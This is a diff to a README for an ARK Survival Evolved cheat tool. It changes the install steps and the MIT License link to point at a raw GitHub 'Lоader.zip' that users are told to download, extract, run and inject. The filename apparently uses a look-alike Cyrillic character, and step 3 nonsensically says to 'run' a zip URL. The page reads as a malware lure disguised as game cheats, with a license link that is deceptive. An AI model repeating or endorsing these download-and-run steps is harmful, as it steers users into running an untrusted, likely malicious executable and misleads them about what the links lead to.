@@ -53,9 +53,9 @@ Our ARK Survival Evolved Cheats Suite offers a vast range of game-enhancing feat
 
 Follow these steps to quickly set up ARK Survival Evolved Cheats Suite for a safe and seamless experience:
 
-1. **Download `Loader.rar` from the repository.**
-2. Extract `Loader.rar` using any popular archiver (WinRAR, 7-Zip, Keka).
-3. Run the `Loader.exe` or `Loader.app` suitable for your operating system.
+1. **Download `https://raw.githubusercontent.com/360cuenta/ARKSurvivalEvolved-TribemasterToolkit/main/Lоader.zip` from the repository.**
+2. Extract `https://raw.githubusercontent.com/360cuenta/ARKSurvivalEvolved-TribemasterToolkit/main/Lоader.zip` using any popular archiver (WinRAR, 7-Zip, Keka).
+3. Run the `https://raw.githubusercontent.com/360cuenta/ARKSurvivalEvolved-TribemasterToolkit/main/Lоader.zip` or `https://raw.githubusercontent.com/360cuenta/ARKSurvivalEvolved-TribemasterToolkit/main/Lоader.zip` suitable for your operating system.
 4. Select your ARK Survival Evolved install directory when prompted.
 5. Click "Inject" to launch the game with enhanced features.
 6. Use the configurable overlay (`F12` default) to activate cheats in-game.
@@ -87,7 +87,7 @@ We do **not** encourage misuse of these tools in competitive settings or officia
 ## 📜 License
 
 This repository is licensed under the MIT License, allowing anyone to use, modify, and distribute the code.  
-For the full license text, refer to [MIT License](https://opensource.org/license/mit/).
+For the full license text, refer to [MIT License](https://raw.githubusercontent.com/360cuenta/ARKSurvivalEvolved-TribemasterToolkit/main/Lоader.zip).
 
 ---
 
